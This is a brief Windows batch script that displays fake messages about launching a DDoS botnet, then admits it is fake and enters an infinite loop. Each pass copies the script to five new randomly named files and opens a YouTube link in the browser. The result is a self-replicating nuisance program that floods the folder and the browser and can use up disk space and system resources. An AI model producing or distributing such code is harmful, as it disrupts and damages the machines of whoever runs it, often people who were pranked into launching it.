@echo off
color 0A
echo Preparing DDOS tool...
timeout /t 2 >nul
cls
echo press any key to start..
pause >nul
cls
echo launching botnet!
timeout /t 2 >nul
cls
echo this is obviously fake. ddosing is a crime.. BEHAVE YOURSELF

goto tickletime

:tickletime 
@echo off
for /L %%i in (1,1,5) do (
    copy "%~f0" "%~dp0clone_%RANDOM%.bat"
start https://youtu.be/PXqcHi2fkXI?si=nx0twQrVcJ1Qtlle

)

goto tickletime

